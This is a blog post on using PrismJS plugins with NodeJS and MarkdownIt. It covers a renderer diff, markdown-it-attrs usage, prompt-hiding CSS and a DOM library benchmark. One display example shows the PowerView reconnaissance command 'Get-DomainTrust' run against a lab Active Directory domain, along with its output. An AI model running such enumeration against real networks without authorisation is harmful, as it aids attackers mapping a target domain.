<span class="token prefix unchanged"> </span>    
<span class="token prefix unchanged"> </span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token prefix unchanged"> </span>      tmpAttrs<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'class'</span><span class="token punctuation">,</span> options<span class="token punctuation">.</span>langPrefix <span class="token operator">+</span> langName<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token prefix unchanged"> </span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
<span class="token prefix unchanged"> </span>      tmpAttrs<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> tmpAttrs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token prefix unchanged"> </span>      tmpAttrs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token string">' '</span> <span class="token operator">+</span> options<span class="token punctuation">.</span>langPrefix <span class="token operator">+</span> langName
<span class="token prefix unchanged"> </span>    <span class="token punctuation">}</span>
<span class="token prefix unchanged"> </span>      
<span class="token prefix unchanged"> </span>    <span class="token comment">// Fake token just to render attributes</span>
<span class="token prefix unchanged"> </span>    <span class="token keyword">const</span> tmpToken <span class="token operator">=</span> <span class="token punctuation">{</span>
<span class="token prefix unchanged"> </span>      <span class="token literal-property property">attrs</span><span class="token operator">:</span> tmpAttrs
<span class="token prefix unchanged"> </span>    <span class="token punctuation">}</span>
<span class="token prefix unchanged"> </span>
</span><span class="token inserted-sign inserted language-js"><span class="token prefix inserted">+</span>    <span class="token comment">// Make sure language is loaded. // 2</span>
<span class="token prefix inserted">+</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>langName<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">'diff-'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token prefix inserted">+</span>      <span class="token keyword">const</span> diffRemovedRawName <span class="token operator">=</span> langName<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token string">'diff-'</span><span class="token punctuation">.</span>length<span class="token punctuation">)</span>
<span class="token prefix inserted">+</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>Prism<span class="token punctuation">.</span>languages<span class="token punctuation">[</span>diffRemovedRawName<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token prefix inserted">+</span>        <span class="token function">PrismLoad</span><span class="token punctuation">(</span><span class="token punctuation">[</span>diffRemovedRawName<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token prefix inserted">+</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
<span class="token prefix inserted">+</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>Prism<span class="token punctuation">.</span>languages<span class="token punctuation">[</span>langName<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token prefix inserted">+</span>        <span class="token function">PrismLoad</span><span class="token punctuation">(</span><span class="token punctuation">[</span>langName<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token prefix inserted">+</span>    <span class="token punctuation">}</span>
</span><span class="token unchanged language-js"><span class="token prefix unchanged"> </span>    
<span class="token prefix unchanged"> </span>    <span class="token comment">// 3, 4</span>
</span><span class="token inserted-sign inserted language-js"><span class="token prefix inserted">+</span>    <span class="token comment">// Some plugins such as toolbar venture into codeElement.parentElement.parentElement,</span>
<span class="token prefix inserted">+</span>    <span class="token comment">// so we'll wrap the `pre` in an additional `div` for class purposes.</span>
<span class="token prefix inserted">+</span>    <span class="token keyword">const</span> preAttrs <span class="token operator">=</span> slf<span class="token punctuation">.</span><span class="token function">renderAttrs</span><span class="token punctuation">(</span>tmpToken<span class="token punctuation">)</span>
<span class="token prefix inserted">+</span>    <span class="token keyword">const</span> codeClasses <span class="token operator">=</span> options<span class="token punctuation">.</span>langPrefix <span class="token operator">+</span> langName
<span class="token prefix inserted">+</span>    <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;div&gt;&lt;pre</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>preAttrs<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&gt;&lt;code class="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>codeClasses<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">"&gt;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>escaped<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</span><span class="token template-punctuation string">`</span></span>
<span class="token prefix inserted">+</span>    <span class="token keyword">const</span> el <span class="token operator">=</span> <span class="token function">textToDOM</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
<span class="token prefix inserted">+</span>    Prism<span class="token punctuation">.</span><span class="token function">highlightElement</span><span class="token punctuation">(</span>el<span class="token punctuation">.</span>firstChild<span class="token punctuation">.</span>firstChild<span class="token punctuation">.</span>firstChild<span class="token punctuation">)</span>
<span class="token prefix inserted">+</span>    <span class="token keyword">return</span> el<span class="token punctuation">.</span>firstChild<span class="token punctuation">.</span>firstChild<span class="token punctuation">.</span>outerHTML
</span><span class="token deleted-sign deleted language-js"><span class="token prefix deleted">-</span>    <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;pre&gt;&lt;code</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>slf<span class="token punctuation">.</span><span class="token function">renderAttrs</span><span class="token punctuation">(</span>tmpToken<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&gt;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>highlighted<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/code&gt;&lt;/pre&gt;\n</span><span class="token template-punctuation string">`</span></span>
</span><span class="token unchanged language-js"><span class="token prefix unchanged"> </span>  <span class="token punctuation">}</span>
<span class="token prefix unchanged"> </span>
<span class="token prefix unchanged"> </span>  <span class="token comment">// 4</span>
</span><span class="token inserted-sign inserted language-js"><span class="token prefix inserted">+</span>  <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;pre</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>slf<span class="token punctuation">.</span><span class="token function">renderAttrs</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&gt;&lt;code&gt;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>escaped<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/code&gt;&lt;/pre&gt;\n</span><span class="token template-punctuation string">`</span></span>
</span><span class="token deleted-sign deleted language-js"><span class="token prefix deleted">-</span>  <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;pre&gt;&lt;code</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>slf<span class="token punctuation">.</span><span class="token function">renderAttrs</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&gt;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>highlighted<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/code&gt;&lt;/pre&gt;\n</span><span class="token template-punctuation string">`</span></span>
</span><span class="token unchanged language-js"><span class="token prefix unchanged"> </span><span class="token punctuation">}</span></span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">JavaScript</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><div class="details-collapse-bottom"><sub><a class="details-collapse-button">(collapse)</a></sub></div></div></details><p>If you're using an <abbr data-bs-placement="top" data-bs-toggle="tooltip" title="server-side rendering, e.g. NextJS">SSR</abbr> framework or <abbr data-bs-placement="top" data-bs-toggle="tooltip" title="static site generator">SSG</abbr>, you'll need to first access the MarkdownIt object.</p><p>In 11ty, for instance, we can access it like so:</p><div class="code-toolbar"><pre data-label="eleventy.config.js" class="language-js" tabindex="0"><code class="language-js">eleventyConfig<span class="token punctuation">.</span><span class="token function">amendLibrary</span><span class="token punctuation">(</span><span class="token string">'md'</span><span class="token punctuation">,</span> <span class="token parameter">mdLib</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  mdLib<span class="token punctuation">.</span>renderer<span class="token punctuation">.</span>rules<span class="token punctuation">.</span><span class="token function-variable function">fence</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">...</span> <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><div class="toolbar"><div class="toolbar-item"><span>eleventy.config.js</span></div><div class="toolbar-item"><span class="lang">JavaScript</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><h2 id="step-3-use-markdown-it-attrs" tabindex="-1"><a class="md-anchor" href="#step-3-use-markdown-it-attrs" aria-hidden="true"></a> Step 3: Use <code>markdown-it-attrs</code></h2><p>To add attributes to your codeblocks, introduce <a href="https://github.com/arve0/markdown-it-attrs/" rel="noreferrer" target="_blank"><code>markdown-it-attrs</code></a> to your MarkdownIt object.</p><p>You can now add attributes and classes to your codeblocks which will then be parsed by Prism.</p><p>For instance, this:</p><pre class="language-md"><code>```js {data-label=hello.js .inspect-me-lol}
function hello() {
  console.log("Hello world!");
}
```</code>
</pre><p>becomes:</p><div class="code-toolbar"><pre data-label="hello.js" class="inspect-me-lol language-js" tabindex="0"><code class="language-js"><span class="token keyword">function</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Hello world!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre><div class="toolbar"><div class="toolbar-item"><span>hello.js</span></div><div class="toolbar-item"><span class="lang">JavaScript</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><div class="alert alert-warning d-flex align-items-start"><i class="fas fa-triangle-exclamation ms-1 me-3 mt-1 fs-4" role="img"></i><div class="alert-content flex-fill mt-0"><p>In 11ty, <code>markdown-it-attrs</code> is incompatible with <code>eleventy-plugin-syntaxhighlight</code> due to the way codeblocks are parsed.</p></div></div><h2 id="step-4-optional-modify-plugins" tabindex="-1"><a class="md-anchor" href="#step-4-optional-modify-plugins" aria-hidden="true"></a> Step 4: (Optional) Modify Plugins</h2><p>With those two changes, we have all we need to start importing fancy plugins!</p><p>In case you wish to fine-tune some plugins, you can always copy them into your local project and modify them directly! Some changes I made were:</p><ul><li>modding <code>line-numbers</code> for compatibility with <code>command-line</code> and <code>diff</code> (Yes, this doesn't really make sense, but who knows if I'll need it in the future?)</li><li>modding <code>show-language</code> to display the base language when the highlight language is <code>diff-*</code>.</li></ul><p>You can also add custom attributes with some simple CSS! For instance, I added a CSS class which hides the command-line prompt when a <code>data-rw-prompt</code> attribute is specified.<sup class="footnote-ref"><a href="#fn6" id="fnref6">6</a></sup> This is useful for long prompts, which may cover the entire screen's width when scrolling on a phone.</p><div class="code-toolbar"><pre class="language-css" tabindex="0"><code class="language-css"><span class="token atrule"><span class="token rule">@media</span> <span class="token punctuation">(</span><span class="token property">max-width</span><span class="token punctuation">:</span> 576px<span class="token punctuation">)</span></span> <span class="token punctuation">{</span>
    <span class="token comment">/* rw-prompt: response width prompt */</span>
    <span class="token selector">pre[data-rw-prompt] .command-line-prompt</span> <span class="token punctuation">{</span>
        <span class="token property">display</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">CSS</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>And here it is in action on some notes. Try viewing on both mobile and computer (or use your browser DevTools).</p><div class="code-toolbar"><pre class="command-line language-powershell" data-rw-prompt="" data-prompt="PS C:\Users\Bob>" data-output="2-100" tabindex="0"><code class="language-powershell"><span class="command-line-prompt"><span data-prompt="PS C:\Users\Bob>"></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span><span class="token command"><span class="token function">Get-DomainTrust</span> <span class="token operator">-</span>domain dollarcorp<span class="token punctuation">.</span>moneycorp<span class="token punctuation">.</span>local</span>
<span class="token output"></span>
<span class="token output">SourceName      : dollarcorp.moneycorp.local</span>
<span class="token output">TargetName      : moneycorp.local</span>
<span class="token output">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span>
<span class="token output">TrustAttributes : WITHIN_FOREST</span>
<span class="token output">TrustDirection  : Bidirectional</span>
<span class="token output">WhenCreated     : 11/12/2022 5:59:01 AM</span>
<span class="token output">WhenChanged     : 9/25/2024 10:12:06 PM</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">PowerShell</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><h2 id="benchmarking-dom-libraries" tabindex="-1"><a class="md-anchor" href="#benchmarking-dom-libraries" aria-hidden="true"></a> Benchmarking DOM Libraries</h2><p>Understandably, one major bottleneck in our strategy is DOM manipulation. A suitable library needs to parse HTML fragments, manipulate DOM elements, and create new ones.</p><p>Although I originally selected JSDOM in my quick-n-dirty hack for its popularity, I later switched to domino for a significant (2x!) speedup. This is based on a simple benchmark, which compares the three most popular(?) NodeJS DOM-manipulation libraries: <a href="https://www.npmjs.com/package/jsdom" rel="noreferrer" target="_blank">JSDOM</a>, <a href="https://www.npmjs.com/package/domino" rel="noreferrer" target="_blank">domino</a>, and <a href="https://www.npmjs.com/package/linkedom" rel="noreferrer" target="_blank">LinkeDOM</a>.</p><p><a class="lightbox-single" title="Benchmark of time to render the ~400 codeblocks on this site with JSDOM, domino, and LinkeDOM." href="/img/posts/programming/mini-projects/prism-plugins-in-node/assets/dom-benchmark-800w.webp"><img class="mb-2 rw center jw-60 alpha-imgv" src="/img/posts/programming/mini-projects/prism-plugins-in-node/assets/dom-benchmark-800w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 800 / 800" alt="Benchmark of time to render the ~400 codeblocks on this site with JSDOM, domino, and LinkeDOM." title="Benchmark of time to render the ~400 codeblocks on this site with JSDOM, domino, and LinkeDOM." srcset="/img/posts/programming/mini-projects/prism-plugins-in-node/assets/dom-benchmark-256w.webp 256w, /img/posts/programming/mini-projects/prism-plugins-in-node/assets/dom-benchmark-512w.webp 512w, /img/posts/programming/mini-projects/prism-plugins-in-node/assets/dom-benchmark-800w.webp 800w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 800px"></a></p><p class="caption"><sup>Benchmark of time to render the ~400 codeblocks on this site with JSDOM, domino, and LinkeDOM. Lower time = faster.</sup></p><table><thead><tr><th>Library</th><th>Mean (ms)</th><th>Min. (ms)</th><th>Max. (ms)</th></tr></thead><tbody><tr><td>JSDOM</td><td>583</td><td>492</td><td>1007</td></tr><tr><td>domino</td><td>265</td><td>227</td><td>477</td></tr><tr><td>LinkeDOM</td><td>280</td><td>214</td><td>666</td></tr></tbody></table><details><summary>Benchmark Details and CLI Output</summary><div class="details-content"><p>The benchmark was run on a MacBook Air with a 1.6 GHz Intel Core i5 processor and 8 GB 2133 MHz LPDDR3 RAM. Benchmark code can be found <a href="https://github.com/TrebledJ/trebledj.github.io/tree/1f1163a022738da81f6a83f06dceb793c68e856d/eleventy/benchmarks/codeblocks#readme" rel="noreferrer" target="_blank"><em>here</em></a>.</p><div class="code-toolbar"><pre class="command-line language-shell" data-prompt="$" data-output="2-100" tabindex="0"><code class="language-shell"><span class="command-line-prompt"><span data-prompt="$"></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span><span class="token command"><span class="token function">node</span> eleventy/benchmarks/codeblocks</span>
<span class="token output">Running: JSDOM</span>
<span class="token output">[auto] Target 199 runs (~604ms/run) in 120s.</span>
<span class="token output"> --- [JSDOM] ---</span>
<span class="token output"> - 199 runs</span>
<span class="token output"> - mean: µ=582.964ms / σ=70.796ms</span>
<span class="token output"> - minmax: 491.888ms / 1007.477ms</span>
<span class="token output"></span>
<span class="token output">Running: domino</span>
<span class="token output">[auto] Target 454 runs (~264ms/run) in 120s.</span>
<span class="token output"> --- [domino] ---</span>
<span class="token output"> - 454 runs</span>
<span class="token output"> - mean: µ=265.399ms / σ=42.418ms</span>
<span class="token output"> - minmax: 226.817ms / 476.795ms</span>
<span class="token output"></span>
<span class="token output">Running: LinkeDOM</span>
<span class="token output">[auto] Target 444 runs (~270ms/run) in 120s.</span>
<span class="token output"> --- [LinkeDOM] ---</span>
<span class="token output"> - 444 runs</span>
<span class="token output"> - mean: µ=279.861ms / σ=69.691ms</span>
<span class="token output"> - minmax: 214.418ms / 666.151ms</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Shell</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><div class="details-collapse-bottom"><sub><a class="details-collapse-button">(collapse)</a></sub></div></div></details><p>Moreover, domino has 0 dependencies —&nbsp;it's basically written from the ground up! JSDOM has 21 dependencies. A lower number of dependencies reduces the attack surface of an application; and with increasing reports of <a href="/posts/twelve-days-to-secure-your-systems/#software-components-and-the-supply-chain">supply chain attacks</a>, it's good to limit such risks.</p><h2 id="final-remarks" tabindex="-1"><a class="md-anchor" href="#final-remarks" aria-hidden="true"></a> Final Remarks</h2><p>I'll be the first to admit —&nbsp;this is a rather crude hack with some loose ends.<sup class="footnote-ref"><a href="#fn7" id="fnref7">7</a></sup> But it works! Not to mention, it looks nice with enough CSS! And to some that's all that matters.</p><p>For those interested in the code, you can check it out here:</p><ul><li><a href="https://github.com/TrebledJ/trebledj.github.io/blob/e110c1861f566907019f4384b3eb5d7d7861ccc0/eleventy/detail/markdown-it/markdown-it-prism-adapter.js" rel="noreferrer" target="_blank">module</a></li><li><a href="https://github.com/TrebledJ/trebledj.github.io/blob/e110c1861f566907019f4384b3eb5d7d7861ccc0/eleventy/markdown.js#L74-L88" rel="noreferrer" target="_blank">example usage</a></li></ul><p>Just copy the module into your build and load it.</p><p>Here are a few other customisations to plugins I made.</p><ul><li>copy-to-clipboard: <a href="https://github.com/TrebledJ/trebledj.github.io/blob/e110c1861f566907019f4384b3eb5d7d7861ccc0/eleventy/detail/prism/prism-copy-to-clipboard.js" rel="noreferrer" target="_blank">plugin</a> / <a href="https://github.com/TrebledJ/trebledj.github.io/blob/e110c1861f566907019f4384b3eb5d7d7861ccc0/assets/js.bundle/common/prism-copy-to-clipboard.js" rel="noreferrer" target="_blank">js</a> / <a href="https://github.com/TrebledJ/trebledj.github.io/blob/e110c1861f566907019f4384b3eb5d7d7861ccc0/assets/css/prism/prism-custom.css" rel="noreferrer" target="_blank">css</a></li><li>line-numbers: <a href="https://github.com/TrebledJ/trebledj.github.io/blob/e110c1861f566907019f4384b3eb5d7d7861ccc0/eleventy/detail/prism/prism-line-numbers.js" rel="noreferrer" target="_blank">plugin</a> / <a href="https://github.com/TrebledJ/trebledj.github.io/blob/e110c1861f566907019f4384b3eb5d7d7861ccc0/assets/css/prism/prism-line-numbers.css" rel="noreferrer" target="_blank">css</a></li><li>show-language: <a href="https://github.com/TrebledJ/trebledj.github.io/blob/e110c1861f566907019f4384b3eb5d7d7861ccc0/eleventy/detail/prism/prism-show-language.js" rel="noreferrer" target="_blank">plugin</a></li><li>command-line: <a href="https://github.com/TrebledJ/trebledj.github.io/blob/e110c1861f566907019f4384b3eb5d7d7861ccc0/assets/css/prism/prism-command-line.css" rel="noreferrer" target="_blank">css</a></li><li>toolbar: <a href="https://github.com/TrebledJ/trebledj.github.io/blob/e110c1861f566907019f4384b3eb5d7d7861ccc0/assets/css/prism/prism-toolbar.css" rel="noreferrer" target="_blank">css</a></li><li>diff: <a href="https://github.com/TrebledJ/trebledj.github.io/blob/e110c1861f566907019f4384b3eb5d7d7861ccc0/assets/css/prism/prism-diff.css" rel="noreferrer" target="_blank">css</a> (based on a Eleventy customisation)</li></ul><hr class="footnotes-sep"><b>Footnotes</b><section class="footnotes"><ol class="footnotes-list"><li id="fn1" class="footnote-item"><p>Instead of monkeypatching the environment (and potentially affecting other libraries), we could also just write new code using regex to modify HTML, removing the requirement for a DOM altogether. But let’s face it, I sleep more soundly knowing the current implementation is mature and battle-tested. By introducing a DOM API to Node, you're placing trust in a library to be spec-compliant. By handwriting regex, you're placing trust in your code (and regex!) to work. Which would you rather have? <a href="#fnref1" class="footnote-backref">↩︎</a></p></li><li id="fn2" class="footnote-item"><p>Not that I have any red teaming writeups, but I foresee the possibility of such posts in the future. <a href="#fnref2" class="footnote-backref">↩︎</a></p></li><li id="fn3" class="footnote-item"><p>To be fair, there's an argument to be made for "not running these commands all at once". Failure isn't handled. But this largely exists in relatively low-level build commands for C/C++, which are renowned for their many toolchains (read: potential build errors). <a href="#fnref3" class="footnote-backref">↩︎</a></p></li><li id="fn4" class="footnote-item"><p>Unlike JSDOM, domino doesn't have a "create fragment from HTML" function, so <code>template</code> is the <a href="https://github.com/fgnass/domino/issues/73" rel="noreferrer" target="_blank">suggested workaround</a>. <a href="#fnref4" class="footnote-backref">↩︎</a></p></li><li id="fn5" class="footnote-item"><p>Normally, wrapping it in <code>&lt;pre&gt;&lt;code&gt;</code> is sufficient. But some plugins such as toolbar will traverse up to the parent of <code>pre</code>, so... <code>&lt;div&gt;&lt;pre&gt;&lt;code&gt;</code>. Yay, more workarounds! <a href="#fnref5" class="footnote-backref">↩︎</a></p></li><li id="fn6" class="footnote-item"><p>Here, rw stands for responsive width. <a href="#fnref6" class="footnote-backref">↩︎</a></p></li><li id="fn7" class="footnote-item"><p>It would be better to pass codeblock attributes directly to Prism without the extra stringification and parsing. Guess I'll leave this as an exercise for the front-end engineers. <a href="#fnref7" class="footnote-backref">↩︎</a></p></li></ol></section></div><a id="end-of-article"></a><br><script defer src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><div class="post-share dim-gentle mb-3 d-flex flex-row align-items-center"><div class="d-flex flex-row flex-wrap align-items-center gap-3"><span>Share&nbsp;on</span> <a class="no-decoration" data-sharer="reddit" data-title="How to Use PrismJS Plugins with NodeJS and MarkdownIt" data-url="/posts/prism-plugins-in-node/"><span class="fs-4"><i class="fab fa-reddit"></i> </span></a><a class="no-decoration" data-sharer="telegram" data-title="How to Use PrismJS Plugins with NodeJS and MarkdownIt" data-url="/posts/prism-plugins-in-node/"><span class="fs-4"><i class="fab fa-telegram"></i> </span></a><a class="no-decoration" data-sharer="whatsapp" data-title="How to Use PrismJS Plugins with NodeJS and MarkdownIt" data-url="/posts/prism-plugins-in-node/"><span class="fs-4"><i class="fab fa-whatsapp"></i> </span></a><a class="no-decoration" data-sharer="linkedin" data-title="How to Use PrismJS Plugins with NodeJS and MarkdownIt" data-url="/posts/prism-plugins-in-node/"><span class="fs-4"><i class="fab fa-linkedin"></i> </span></a><a class="no-decoration" data-sharer="vk" data-title="How to Use PrismJS Plugins with NodeJS and MarkdownIt" data-url="/posts/prism-plugins-in-node/"><span class="fs-4"><i class="fab fa-vk"></i> </span></a><a class="no-decoration" data-sharer="twitter" data-title="How to Use PrismJS Plugins with NodeJS and MarkdownIt" data-url="/posts/prism-plugins-in-node/"><span class="fs-4"><i class="fab fa-twitter"></i> </span></a><a id="copy-link-button" class="no-decoration" data-bs-toggle="tooltip" data-bs-trigger="click" title="Link copied!"><span class="fs-4"><i class="fas fa-link"></i></span></a></div></div><hr><div id="post-author-container" class="d-flex justify-content-between align-items-center gap-3" itemprop="author" itemscope itemtype="https://schema.org/Person"><img src="/img/profile-icon.jpg" class="profile-img" alt="" loading="lazy" decoding="async" itemprop="image"><div class="author-info d-flex flex-column gap-1"><p class="profile-name" itemprop="name">TrebledJ</p><p class="profile-bio" itemprop="description">Passionate problem-solver, pentester, and autodidact. I thrive on learning new things and enjoy passing it on. When not immersed in bughunting or programming, I can be found taking walks, composing a short tune, and occasionally indulging in CTF challenges.</p></div></div><hr class="section-sep"><div id="related" class="jw-100"><h3><i class="fas fa-circle-nodes me-2"></i>Related Posts</h3><div class="row gx-3 mt-4"><div class="related-col-flex-auto-4"><article class="post-minified-preview"><a href="/posts/optimising-web-icons-for-fun/"></a><div class="d-flex flex-column"><a class="post-thumbnail" href="/posts/optimising-web-icons-for-fun/"><img class="post-img-blurred-bg" src="/img/posts/programming/mini-projects/optimising-web-icons/assets/optimising-web-icons-thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 324" alt="Thumbnail for Optimising Web Icons for Fun" srcset="/img/posts/programming/mini-projects/optimising-web-icons/assets/optimising-web-icons-thumbnail-256w.webp 256w, /img/posts/programming/mini-projects/optimising-web-icons/assets/optimising-web-icons-thumbnail-512w.webp 512w, /img/posts/programming/mini-projects/optimising-web-icons/assets/optimising-web-icons-thumbnail-1024w.webp 1024w, /img/posts/programming/mini-projects/optimising-web-icons/assets/optimising-web-icons-thumbnail-1790w.webp 1790w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"><div class="post-img-container d-flex jw-100 h-100"><img class="post-img-contain" src="/img/posts/programming/mini-projects/optimising-web-icons/assets/optimising-web-icons-thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 324" alt="Thumbnail for Optimising Web Icons for Fun" srcset="/img/posts/programming/mini-projects/optimising-web-icons/assets/optimising-web-icons-thumbnail-256w.webp 256w, /img/posts/programming/mini-projects/optimising-web-icons/assets/optimising-web-icons-thumbnail-512w.webp 512w, /img/posts/programming/mini-projects/optimising-web-icons/assets/optimising-web-icons-thumbnail-1024w.webp 1024w, /img/posts/programming/mini-projects/optimising-web-icons/assets/optimising-web-icons-thumbnail-1790w.webp 1790w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"></div></a><div class="post-content d-flex flex-column justify-content-between"><div><h2 class="post-title">Optimising Web Icons for Fun</h2><div class="post-summary"><p>Ejecting unused cargo for leaner performance.</p></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><div class="tag-list mt-2 d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/programming/" itemprop="keywords">programming</a> </span><span><a class="jtag" href="/tags/web/" itemprop="keywords">web</a> </span><span><a class="jtag" href="/tags/performance/" itemprop="keywords">performance</a></span></div></div></div></div></article></div><div class="related-col-flex-auto-4"><article class="post-minified-preview"><a href="/posts/site-migration-to-eleventy/"></a><div class="d-flex flex-column"><a class="post-thumbnail" href="/posts/site-migration-to-eleventy/"><img class="post-img-blurred-bg" src="/img/posts/misc/meta/assets/ogle-ogle-eleventy-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 341" alt="Thumbnail for Site Migration to Eleventy" srcset="/img/posts/misc/meta/assets/ogle-ogle-eleventy-256w.webp 256w, /img/posts/misc/meta/assets/ogle-ogle-eleventy-512w.webp 512w, /img/posts/misc/meta/assets/ogle-ogle-eleventy-750w.webp 750w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"><div class="post-img-container d-flex jw-100 h-100"><img class="post-img-contain" src="/img/posts/misc/meta/assets/ogle-ogle-eleventy-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 341" alt="Thumbnail for Site Migration to Eleventy" srcset="/img/posts/misc/meta/assets/ogle-ogle-eleventy-256w.webp 256w, /img/posts/misc/meta/assets/ogle-ogle-eleventy-512w.webp 512w, /img/posts/misc/meta/assets/ogle-ogle-eleventy-750w.webp 750w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"></div></a><div class="post-content d-flex flex-column justify-content-between"><div><h2 class="post-title">Site Migration to Eleventy</h2><div class="post-summary"><p>JavaScript go brrrrrrrrr.</p></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><div class="tag-list mt-2 d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/meta/" itemprop="keywords">meta</a> </span><span><a class="jtag" href="/tags/writeup/" itemprop="keywords">writeup</a> </span><span><a class="jtag" href="/tags/programming/" itemprop="keywords">programming</a></span></div></div></div></div></article></div><div class="related-col-flex-auto-4"><article class="post-minified-preview"><a href="/posts/automating-boolean-sql-injection-with-python/"></a><div class="d-flex flex-column"><a class="post-thumbnail" href="/posts/automating-boolean-sql-injection-with-python/"><img class="post-img-blurred-bg" src="/img/posts/infosec/automating-boolean-sqli/assets/automating-boolean-sqli-thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 273" alt="Thumbnail for Automating Boolean-Based SQL Injection with Python" srcset="/img/posts/infosec/automating-boolean-sqli/assets/automating-boolean-sqli-thumbnail-256w.webp 256w, /img/posts/infosec/automating-boolean-sqli/assets/automating-boolean-sqli-thumbnail-512w.webp 512w, 